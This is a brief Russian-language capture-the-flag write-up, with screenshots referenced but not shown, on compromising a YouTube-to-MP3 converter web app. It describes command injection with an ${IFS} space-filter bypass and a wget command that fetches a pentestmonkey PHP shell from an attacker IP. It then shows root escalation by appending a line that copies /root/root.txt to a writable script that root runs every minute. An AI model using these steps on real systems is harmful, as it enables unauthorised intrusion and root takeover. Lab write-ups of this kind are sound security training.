
Находим веб-приложение которое принимает ссылку на видео youtube и конвертирует его в mp3
![](../attachment/Pasted%20image%2020251007165342.png)

Проверим возможность выполнения команд

![](../attachment/Pasted%20image%2020251007172343.png)

Прочитаем флаг. В качестве пробела используем оболочку ${IFS} 

![](../attachment/Pasted%20image%2020251007165753.png)

С помощью wget${IFS}http://IP/shell.php передадим php pentestmonkey shell и получим доступ к системе перейдя на страницу shell.php

![](../attachment/Pasted%20image%2020251007172941.png)
Изучив систему находим файл /var/www/html/tmp/clean.sh который выполняется каждую минуту от root
Добавим в него строку чтобы записать флаг рута в /var/www/html/tmp/rootflag.txt

```
cat /root/root.txt > rootflag.txt
```